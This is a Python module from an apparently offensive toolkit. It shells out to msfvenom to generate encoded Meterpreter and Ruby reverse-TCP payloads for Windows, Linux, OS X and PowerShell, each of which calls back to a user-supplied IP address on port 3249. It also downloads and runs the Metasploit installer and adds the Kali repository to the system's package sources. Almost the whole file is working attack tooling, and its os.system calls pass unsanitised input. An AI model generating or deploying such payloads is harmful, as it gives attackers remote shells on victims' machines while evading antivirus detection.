from module import ModuleObject
import os
import re

class RawhexModule(ModuleObject):

    def __init__(self, ui):
        ModuleObject.__init__(self)
        self.ui = ui
        self.vars = {}
        self.vars["payfiletype"] = ["", "Metasploit Payload Filetype"]
        self.vars["insmsf"] = ["", "Install Metasploit On Your Linux Computer"]
        self.vars["ipaddr"] = ["", "Your Ip Address To Use"]
        self.vars["addkalirepo"] = ["", "Add Kali Linux Repository To Your Linux System!"]
        self.description = " Module for generate metasploit payload + install metasploit"
        self.module_name = "\033[33mroot@dkmcpro:~/rawhex#\033[33m"
    
    def run_action(self):
       if self.vars["payfiletype"][0].lower() == "raw":
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f raw > msfraw.raw" %self.vars["ipaddr"][0])
           os.system("mv msfraw.raw output/")
           print "[-----------------------------]"
           print "The metasploit raw payload has been generated.The output file is output/msfraw.raw and the listening port is 3249"
       if self.vars["payfiletype"][0].lower() == "hex":
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f hex > msfhex.hex" %self.vars["ipaddr"][0])
           os.system("mv msfhex.hex output/")
           print "[-----------------------------]"
           print "The metasploit hex payload has been been generated.The output file is output/msfhex.hex and the listening port is 3249"
       if self.vars["insmsf"][0].lower() == "true":
           print "This maybe take a few minute......Make Sure You Have Internet Connection"
           print "[-----------------------------------]"
           os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall')
           print "[-------------------------------------------------------]"
           print "Metasploit-Framework has been installed....Type 'msfconsole' to start msfconsole"
       if self.vars["payfiletype"][0].lower() == "exe":
           print "[-----------------------------]"
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f exe > msfexe.exe" %self.vars["ipaddr"][0])
           os.system("mv msfexe.exe output/")
           print "The metasploit exe payload has been been generated.The output file is output/msfexe.exe and the listening port is 3249"
       if self.vars["payfiletype"][0].lower() == "osxelf":
           print "[-----------------------------]"
           os.system("msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f elf > msfosxelf.elf" %self.vars["ipaddr"][0])
           os.system("mv msfosxelf.elf output/")
           print "The metasploit elf payload has been been generated.The output file is output/msfosx.elf and the listening port is 3249....REMEMBER,THIS PAYLOAD ONLY WORK WITH OS X x64"
       if self.vars["payfiletype"][0].lower() == "ruby":
           print "[-----------------------------]"
           os.system("msfvenom -p  ruby/shell_reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f ruby > msfruby.ruby" %self.vars["ipaddr"][0])
           os.system("mv msfruby.ruby output/")
           print "The metasploit ruby payload has been been generated.The output file is output/msfruby.ruby and the listening port is 3249"
       if self.vars["payfiletype"][0].lower() == "linuxelf":
           print "[-----------------------------]"
           os.system("msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f elf > msflinuxelf.elf" %self.vars["ipaddr"][0])
           os.system("mv msflinuxelf.elf output/")
           print "The metasploit elf payload has been been generated.The output file is output/msflinuxelf.elf and the listening port is 3249....REMEMBER,THIS PAYLOAD ONLY FOR LINUX X64"
       if self.vars["payfiletype"][0].lower() == "java":
           print "[-----------------------------]"
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f java > msfjava.js" %self.vars["ipaddr"][0])
           os.system("mv msfjava.js output/")
           print "The metasploit java payload has been been generated.The output file is output/msfjava.js and the listening port is 3249"
       if self.vars["payfiletype"][0].lower() == "js_le":
           print "[-----------------------------]"
           os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 6 -f js_le > msfjavasc.txt" %self.vars["ipaddr"][0])
           os.system("mv msfjavasc.txt output/")
           print "The metasploit java payload has been been generated.The output file is output/msfjavasc.txt and the listening port is 3249"
       else:
           self.ui.print_error("An Error Occured...Please Check Your Input!!")
       if self.vars["addkalirepo"][0].lower() == "true":
           print "[-----------------------------]"
           os.system("apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6")
           os.system("echo '# Kali linux repositories | Added by DKMCPRO\ndeb http://http.kali.org/kali kali-rolling main contrib non-free' >> /etc/apt/sources.list")
           print "[---] Kali Repository Has Been Added To Your Sources.list [---]"
       if self.vars["payfiletype"][0].lower() == "psh":
           print "[-----------------------------]"
           os.system ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=3249 -e x86/shikata_ga_nai -i 4 -f psh > msfpsh.ps1" %self.vars["ipaddr"][0])
           os.system("mv msfpsh.ps1 output/")
           print "The metasploit psh payload has been been generated.The output file is output/msfpsh.ps1 and the listening port is 3249"

    def help_me(self):
       print ""
       print "[-------------------------------------------------------]"
       print "[---]     The Payload Supported FileType Is:        [---]"
       print "[---]raw,hex,exe,osxelf,ruby,linuxelf,java,js_le,psh[---]"
       print "[---]                Extra Info:                    [---]"
       print "[---]   osxelf : The .elf Payload Filetype For OSX  [---]"
       print "[---] linuxelf : The .elf Payload Filetype For Linux[---]"
       print "[-------------------------------------------------------]"
       print "[---]         Example To Use This Module Is:        [---]"
       print "[---] 1. set payfiletype <yourpayloadfiletypetouse> [---]"
       print "[---] 2. set ipaddr <youripaddress>                 [---]"
       print "[---] 3. exploit                                    [---]"
       print "[-------------------------------------------------------]"
       print "[---MAKE SURE YOU HAVE METASPLOIT-FRAMEWORK INSTALLED---]"
